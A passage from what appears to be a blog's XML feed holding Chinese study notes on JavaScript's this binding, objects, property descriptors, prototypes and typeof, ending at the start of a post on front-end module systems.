就是那个被明确指定的对象。<ul><li>var bar = foo.call( obj2 )</li></ul></li><li>函数是通过环境对象（也称为拥有者或容器对象）被调用的吗（隐含绑定）？如果是，this 就是那个环境对象。<ul><li>var bar = obj1.foo()</li></ul></li><li>否则，使用默认的 this（默认绑定）。如果在 strict mode 下，就是 undefined，否则是 global 对象。<ul><li>var bar = foo()</li></ul></li></ul><h3 id="绑定的特例"><a href="#绑定的特例" class="headerlink" title="绑定的特例"></a>绑定的特例</h3><p>正如通常的那样，对于“规则”总有一些 例外。</p><h4 id="被忽略的-this"><a href="#被忽略的-this" class="headerlink" title="被忽略的 this"></a>被忽略的 this</h4><p class="tip">如果你传递 null 或 undefined 作为 call、apply 或 bind 的 this 绑定参数，那么这些值会被忽略掉，取而代之的是 默认绑定 规则将适用于这个调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo.call( null ); // 2</span><br></pre></td></tr></table></figure><blockquote><p>更安全的 this</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function foo(a,b) &#123;</span><br><span class="line">console.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 我们的 DMZ 空对象</span><br><span class="line">var ø = Object.create( null );</span><br><span class="line"></span><br><span class="line">// 将数组散开作为参数</span><br><span class="line">foo.apply( ø, [2, 3] ); // a:2, b:3</span><br><span class="line"></span><br><span class="line">// 用 `bind(..)` 进行 currying</span><br><span class="line">var bar = foo.bind( ø, 2 );</span><br><span class="line">bar( 3 ); // a:2, b:3</span><br></pre></td></tr></table></figure><p>可以通过让其指向一个空对象，使其按照<code>硬绑定</code>原则进行</p><h4 id="间接"><a href="#间接" class="headerlink" title="间接"></a>间接</h4><p>通过赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line">var o = &#123; a: 3, foo: foo &#125;;</span><br><span class="line">var p = &#123; a: 4 &#125;;</span><br><span class="line"></span><br><span class="line">o.foo(); // 3</span><br><span class="line">(p.foo = o.foo)(); // 2</span><br></pre></td></tr></table></figure><h3 id="词法this"><a href="#词法this" class="headerlink" title="词法this"></a>词法this</h3><blockquote><p>一个箭头函数的词法绑定是不能被覆盖</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">  // 返回一个箭头函数</span><br><span class="line">return (a) =&gt; &#123;</span><br><span class="line">    // 这里的 `this` 是词法上从 `foo()` 采用的</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var bar = foo.call( obj1 );</span><br><span class="line">bar.call( obj2 ); // 2, 不是3!</span><br></pre></td></tr></table></figure><blockquote><p>它们本质是使用广为人知的词法作用域来禁止了传统的 <code>this</code> 机制</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">var self = this; // 词法上捕获 `this`</span><br><span class="line">setTimeout( function()&#123;</span><br><span class="line">console.log( self.a );</span><br><span class="line">&#125;, 100 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h2 id="二、对象"><a href="#二、对象" class="headerlink" title="二、对象"></a>二、对象</h2><p>前面我们讲解了 this 绑定如何根据函数调用的调用点指向不同的对象。但究竟什么是对象，为什么我们需要指向它们？</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p class="tip">对象来自于两种形式：声明（字面）形式，和构造形式。</p><blockquote><p>一个对象的字面语法看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">key: value</span><br><span class="line">// ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>构造形式看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myObj = new Object();</span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>构造形式和字面形式的结果是完全同种类的对象。唯一真正的区别在于你可以向字面声明一次性添加一个或多个键/值对，而对于构造形式，你必须一个一个地添加属性。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><blockquote><p>JS 的六种主要类型</p></blockquote><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li><li>object</li></ul><blockquote><p>内建对象</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Function</li><li>Array</li><li>Date</li><li>RegExp</li><li>Error</li></ul><h3 id="基本字面量"><a href="#基本字面量" class="headerlink" title="基本字面量"></a>基本字面量</h3><p>在JavaScript中基本字面量会转换成对象</p><p class="tip">一般来说，我们通过基本字面量：<code>let str = &#39;hello world&#39;;</code>创建的字符串，他只是个基本类型按道理来说不存在属性，但通过<code>str.length</code>却可以轻松渠道str字符串的长度，这是怎么回事呢，原来JavaScript会将<strong>字面量形式的str</strong>，转变成<code>String</code>对象形式的字符串</p><blockquote><p>基本字面量转变成对象的类型</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>RegExp</li></ul><blockquote><p>深浅拷贝</p></blockquote><p>在进行深浅拷贝前，我们先明确，基本数据类型和复杂类型赋值的不同：</p><ul><li>在我们进行赋值操作的时候，基本数据类型的赋值（=）是在内存中新开辟一段栈内存，然后再把再将值赋值到新的栈中</li><li>但是引用类型的赋值是传址。只是改变指针的指向，例如，也就是说引用类型的赋值是对象保存在栈中的地址的赋值，这样的话两个变量就指向同一个对象，因此两者之间操作互相有影响</li></ul><blockquote><p>赋值（=）和浅拷贝的区别</p></blockquote><p>浅复制只会将对象的各个属性进行依次复制，并不会进行递归复制，而 JavaScript 存储对象都是存地址的，所以浅复制会导致赋值后的对象属性指向同一个内存地址</p><h3 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h3><blockquote><p>获取对象属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );</span><br><span class="line">// &#123;</span><br><span class="line">//    value: 2,</span><br><span class="line">//    writable: true,</span><br><span class="line">//    enumerable: true,</span><br><span class="line">//    configurable: true</span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><blockquote><p>明确定义一个属性</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2,</span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true</span><br><span class="line">&#125; );</span><br><span class="line"></span><br><span class="line">myObject.a; // 2</span><br></pre></td></tr></table></figure><p class="tip">使用 defineProperty(..)，我们手动、明确地在 myObject 上添加了一个直白的，普通的 a 属性。然而，你通常不会使用这种手动方法，除非你想要把描述符的某个性质修改为不同的值。</p><blockquote><p>修改属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">    a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2, </span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true </span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure><ul><li>value<ul><li>默认值：设置的初始值</li></ul></li><li>writable<ul><li>可修改性</li><li>默认值：true</li><li>将属性设置true后，修改属性值，将会发生<code>TypeError</code>(如果你试图改变一个不可配置属性的描述符定义，就会发生 TypeError)</li></ul></li><li>configurable<ul><li>可配置性</li><li>能否通过defineProperty重新定义特性</li><li>设置false后无法，更改特性</li><li>默认值：true</li><li>阻止的另外一个事情是使用 delete 操作符移除既存属性的能力</li></ul></li><li>enumerable<ul><li>可遍历性</li><li>默认值：true</li></ul></li></ul><h3 id="设置对象的几个方法"><a href="#设置对象的几个方法" class="headerlink" title="设置对象的几个方法"></a>设置对象的几个方法</h3><h4 id="防止扩展-Prevent-Extensions"><a href="#防止扩展-Prevent-Extensions" class="headerlink" title="防止扩展(Prevent Extensions)"></a>防止扩展(Prevent Extensions)</h4><p><code>Object.preventExtensions(..)</code></p><p class="tip">不能添加新的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.preventExtensions( myObject );</span><br><span class="line"></span><br><span class="line">myObject.b = 3;</span><br><span class="line">myObject.b; // undefined</span><br></pre></td></tr></table></figure><h4 id="封印（Seal）"><a href="#封印（Seal）" class="headerlink" title="封印（Seal）"></a>封印（Seal）</h4><p><code>Object.Seal(..)</code></p><p class="tip">它实质上在当前的对象上调用 Object.preventExtensions(..)、并且属性标记为 configurable:false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.Seal( myObject );</span><br></pre></td></tr></table></figure><h4 id="冻结（Freeze）"><a href="#冻结（Freeze）" class="headerlink" title="冻结（Freeze）"></a>冻结（Freeze）</h4><p><code>Object.freeze(..)</code></p><p class="tip">Object.freeze(..) 创建一个冻结的对象，这意味着它实质上在当前的对象上调用 Object.seal(..)，同时也将它所有的“数据访问”属性设置为 writable:false，所以它们的值不可改变。</p><h3 id="混合（淆）“类”的对象"><a href="#混合（淆）“类”的对象" class="headerlink" title="混合（淆）“类”的对象"></a>混合（淆）“类”的对象</h3><p>在JavaScript中是否存在一般语言类似于Java、C++类的概念，而JavaScript中的原型又是什么东西呢</p><p class="tip">在JavaScript中类并不是我们想象中的类，JavaScript还是基于原型的概念进行设计，尽管它看起来存在：<code>new</code>、<code>instanceof</code>这些让你以为它是类的东西</p><p>在开始了解前，我们先明白什么是类？</p><p>类是一种事物的抽象，拿建汽车来说，汽车需要：</p><ul><li>轮胎</li><li>发动机</li><li>后视镜等等…</li></ul><p>我们通过对汽车事物进行抽象，通过实例化产生新的汽车</p><p>并且类还包含继承、多态等概念：同样允许父类的泛化行为被子类覆盖，从而使它更加具体。实际上，相对多态允许我们在覆盖行为中引用基础行为</p><p>类的实例化上就是一个拷贝的过程，如下图：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190408_13k6cb57lifabic37gi0889i67250_253x333.png" alt=""></p><blockquote><p>JavaScript中的”类”</p></blockquote><p class="tip">当你“继承”或是“实例化”时，JavaScript 的对象机制不会 自动地 执行拷贝行为。很简单，在 JavaScript 中没有“类”可以拿来实例化，只有对象。而且对象也不会被拷贝到另一个对象中，而是被 链接在一起</p><p>在其他语言中观察到的类的行为意味着拷贝，让我们来看看 JS 开发者如何在 JavaScript 中 模拟 这种 缺失 的类的拷贝行为：mixins（混合）。我们会看到两种“mixin”：明确的（explicit） 和 隐含的（implicit）</p><h2 id="三、原型（Prototype）"><a href="#三、原型（Prototype）" class="headerlink" title="三、原型（Prototype）"></a>三、原型（Prototype）</h2><h3 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h3><p>每个 普通 的 [[Prototype]] 链的最顶端，是内建的 Object.prototype。这个对象包含各种在整个 JS 中被使用的共通工具，因为 JavaScript 中所有普通（内建，而非被宿主环境扩展的）的对象都“衍生自”（也就是，使它们的 [[Prototype]] 顶端为）Object.prototype 对象。</p><p>你会在这里发现一些你可能很熟悉的工具，比如 .toString() 和 .valueOf()</p><h3 id="设置与遮蔽属性"><a href="#设置与遮蔽属性" class="headerlink" title="设置与遮蔽属性"></a>设置与遮蔽属性</h3><p>如果给一个对象添加属性，而这个属性或方法已经在其<code>[[Prototype]]</code>上已存在，这时是否会展现出”多态”特性，子属性</p><p>让我们来看下面的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.foo = &quot;bar&quot;;</span><br></pre></td></tr></table></figure><p>正如我们被暗示的那样，在 myObject 上的 foo 遮蔽没有看起来那么简单。我们现在来考察 myObject.foo = “bar” 赋值的三种场景，当 foo 不直接存在 于 myObject，但 存在 于 myObject 的 [[Prototype]] 链的更高层时：</p><ul><li>如果一个普通的名为 foo 的数据访问属性在 [[Prototype]] 链的高层某处被找到，而且没有被标记为只读（writable:false），那么一个名为 foo 的新属性就直接添加到 myObject 上，形成一个 遮蔽属性。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到，但是它被标记为 只读（writable:false） ，那么设置既存属性和在 myObject 上创建遮蔽属性都是 不允许 的。如果代码运行在 strict mode 下，一个错误会被抛出。否则，这个设置属性值的操作会被无声地忽略。不论怎样，没有发生遮蔽。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到。没有 foo 会被添加到（也就是遮蔽在）myObject 上。<strong>必须使用 Object.defineProperty(..)</strong></li></ul><h3 id="“类”"><a href="#“类”" class="headerlink" title="“类”"></a>“类”</h3><p>现在你可能会想知道：“为什么 一个对象需要链到另一个对象？” 真正的好处是什么？这是一个很恰当的问题，但在我们能够完全理解和体味它是什么和如何有用之前，我们必须首先理解 [[Prototype]] 不是 什么。</p><p>在 JavaScript 中，对于对象来说没有抽象模式/蓝图，即没有面向类的语言中那样的称为类的东西。JavaScript 只有 对象。</p><p>实际上，在所有语言中，JavaScript 几乎是独一无二的，也许是唯一的可以被称为“面向对象”的语言，因为可以根本没有类而直接创建对象的语言很少，而 JavaScript 就是其中之一。</p><p>在 JavaScript 中，类不能（因为根本不存在）描述对象可以做什么。对象直接定义它自己的行为。这里 仅有 对象。</p><h3 id="“类”函数"><a href="#“类”函数" class="headerlink" title="“类”函数"></a>“类”函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = new Foo();</span><br><span class="line"></span><br><span class="line">Object.getPrototypeOf( a ) === Foo.prototype; // true</span><br></pre></td></tr></table></figure><p>在面向类的语言中，可以制造一个类的多个 拷贝（即“实例”），就像从模具中冲压出某些东西一样。我们在第四章中看到，这是因为初始化（或者继承）类的处理意味着，“将行为计划从这个类拷贝到物理对象中”，对于每个新实例这都会发生。</p><p>但是在 JavaScript 中，没有这样的拷贝处理发生。你不会创建类的多个实例。你可以创建多个对象，它们的 [[Prototype]] 连接至一个共通对象。但默认地，没有拷贝发生，如此这些对象彼此间最终不会完全分离和切断关系，而是 链接在一起。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当试图在一个对象上进行属性访问，而对象又没有该属性时，对象内部的 [[Prototype]] 链接定义了 [[Get]] 操作（见第三章）下一步应当到哪里寻找它。这种对象到对象的串行链接定义了对象的“原形链”（和嵌套的作用域链有些相似），在解析属性时发挥作用。</p><p>所有普通的对象用内建的 Object.prototype 作为原形链的顶端（就像作用域查询的顶端是全局作用域），如果属性没能在链条的前面任何地方找到，属性解析就会在这里停止。toString()，valueOf()，和其他几种共同工具都存在于这个 Object.prototype 对象上，这解释了语言中所有的对象是如何能够访问他们的。</p><p>在 JavaScript 中的关键区别是，没有拷贝发生。取而代之的是对象最终通过 [[Prototype]] 链链接在一起。</p><p class="tip">当一个属性/方法引用在一个对象上发生，而这样的属性/方法又不存在时，这个链接就会被使用。在这种情况下，[[Prototype]] 链接告诉引擎去那个被链接的对象上寻找该属性/方法。接下来，如果那个对象也不能满足查询，就沿着它的 [[Prototype]] 查询，如此继续。这种对象间的一系列链接构成了所谓的“原形链”。<br></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、this关键词&quot;&gt;&lt;a href=&quot;#一、this关键词&quot; class=&quot;headerlink&quot; title=&quot;一、this关键词&quot;&gt;&lt;/a&gt;一、this关键词&lt;/h2&gt;&lt;p class=&quot;tip&quot;&gt;this是关键词，表示指向的索引位置&lt;/p&gt;

&lt;p&gt;很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：&lt;/p&gt;
&lt;p&gt;1、认为this指向，foo函数&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;foo&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;foo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>types &amp; grammar</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/types%20&amp;%20grammar/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/types &amp; grammar/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h2><blockquote><p>基本类型</p></blockquote><p>JavaScript 定义了七种内建类型：</p><p>null<br>undefined<br>boolean<br>number<br>string<br>symbol – 在 ES6 中被加入的！<br>object</p><p><strong>注意</strong>： 除了 object 所有这些类型都被称为“基本类型（primitives）”。</p><blockquote><p>类型检测</p></blockquote><p>typeof 操作符可以检测给定值的类型，而且总是返回七种字符串值中的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined     === &quot;undefined&quot;; // true</span><br><span class="line">typeof true          === &quot;boolean&quot;;   // true</span><br><span class="line">typeof 42            === &quot;number&quot;;    // true</span><br><span class="line">typeof &quot;42&quot;          === &quot;string&quot;;    // true</span><br><span class="line">typeof &#123; life: 42 &#125;  === &quot;object&quot;;    // true</span><br><span class="line"></span><br><span class="line">// 在 ES6 中被加入的！</span><br><span class="line">typeof Symbol()      === &quot;symbol&quot;;    // true</span><br></pre></td></tr></table></figure><p>在上面的列表中剔除了 null。它是 特殊的 – 特殊在它与 typeof 操作符组合时是有 bug 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof null === &quot;object&quot;; // true</span><br></pre></td></tr></table></figure><h3 id="undefined-vs-“undeclared”"><a href="#undefined-vs-“undeclared”" class="headerlink" title="undefined vs “undeclared”"></a>undefined vs “undeclared”</h3><p>当前 还不拥有值的变量，实际上拥有 undefined 值。对这样的变量调用 typeof 将会返回 <code>&quot;undefined&quot;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">var b = 42;</span><br><span class="line">var c;</span><br><span class="line"></span><br><span class="line">// 稍后</span><br><span class="line">b = c;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br><span class="line">typeof c; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>大多数开发者考虑“undefined”这个词的方式会诱使他们认为它是“undeclared（未声明）”的同义词。然而在 JS 中，这两个概念十分不同。</p><p>一个“undefined”变量是在可访问的作用域中已经被声明过的，但是在 这个时刻 它里面没有任何值。相比之下，一个“undeclared”变量是在可访问的作用域中还没有被正式声明的。</p><blockquote><p>考虑这段代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">a; // undefined</span><br><span class="line">b; // ReferenceError: b is not defined</span><br></pre></td></tr></table></figure><p>在上面代码中，b未声明时进行了使用，浏览器反馈的错误是：<code>b is not defined</code>.这当然很容易而且很合理地使人将它与“b is undefined.”搞混。需要重申的是，“undefined”和“is not defined”是非常不同的东西。要是浏览器能告诉我们类似于“b is not found”或者“b is not declared”之类的东西就好了，那会减少这种困惑！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p><code>type</code> 对于未undeclared的变量，返回值也是<code>undefined</code>。即使 是一个未声明变量，也不会有错误被抛出。这是 typeof 的一种特殊的安全防卫行为</p><h3 id="typeof-Undeclared"><a href="#typeof-Undeclared" class="headerlink" title="typeof Undeclared"></a>typeof Undeclared</h3><p>由于typeof安全防卫的特性，我们可以将其用来判断一个变量是否在作用域内进行了赋值操作，倘若不使用typeof，若变量不存在将会发生异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (typeof sss === &quot;undefined&quot;) &#123;</span><br><span class="line">sss = function() &#123; /*..*/ &#125;;</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">&gt; 使用场景</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作为一个简单的例子，想象在你的程序中有一个“调试模式”，它是通过一个称为 DEBUG 的全局变量（标志）来控制的。在实施类似于在控制台上输出一条日志消息这样的调试任务之前，你想要检查这个变量是否被声明了。一个顶层的全局 var DEBUG = true 声明只包含在一个“debug.js”文件中，这个文件仅在你开发/测试时才被加载到浏览器中，而在生产环境中则不会。</span><br><span class="line"></span><br><span class="line">然而，在你其他的程序代码中，你不得不小心你是如何检查这个全局的 DEBUG 变量的，这样你才不会抛出一个 ReferenceError。这种情况下 typeof 上的安全防卫就是我们的朋友。</span><br></pre></td></tr></table></figure><p>// 噢，这将抛出一个错误！<br>if (DEBUG) {<br>    console.log( “Debugging is starting” );<br>}</p><p>// 这是一个安全的存在性检查<br>if (typeof DEBUG !== “undefined”) {<br>    console.log( “Debugging is starting” );<br>}<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、类型&quot;&gt;&lt;a href=&quot;#一、类型&quot; class=&quot;headerlink&quot; title=&quot;一、类型&quot;&gt;&lt;/a&gt;一、类型&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;基本类型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JavaScript 定义了七种内建类型：&lt;/
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端模块化</title>
    <link href="http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/"/>
    <id>http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/</id>
    <published>2019-03-27T03:43:35.000Z</published>
    <updated>2019-04-23T15:16:05.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。</p><blockquote><p>模块化的历史</p></blockquote><p>在正式进入模块化学习前我们来了解一下前端模块化的前生今世。</p><div><a id="more"></a></div><p>这里我就不过多赘述了，可以参考玉伯大佬的<a href="https://github.com/seajs/seajs/issues/547" target="_blank" rel="noopener">前端模块化开发的价值</a></p><blockquote><p>模块化规范</p></blockquote><p>现有模块化标准：</p><ul><li>CommonJS</li><li>AMD</li><li>CMD</li><li>ES6</li></ul><h2 id="浏览器加载脚本"><a href="#浏览器加载脚本" class="headerlink" title="浏览器加载脚本"></a>浏览器加载脚本</h2><blockquote><p>传统方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 